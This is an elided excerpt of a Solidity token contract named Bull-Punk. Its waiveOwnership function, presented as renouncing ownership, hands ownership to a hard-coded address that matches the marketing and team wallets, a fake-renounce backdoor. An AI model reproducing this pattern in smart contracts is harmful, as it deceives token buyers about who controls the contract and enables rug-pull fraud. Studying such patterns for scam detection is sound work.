...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x3Fc22a341A15AB2ddb9577b0221e38b52c312cAf);
    }
...
contract BullPunk is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Bull-Punk";
    string private _symbol = "B-Punk";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x3Fc22a341A15AB2ddb9577b0221e38b52c312cAf);
    address payable public teamWalletAddress = payable(0x3Fc22a341A15AB2ddb9577b0221e38b52c312cAf);
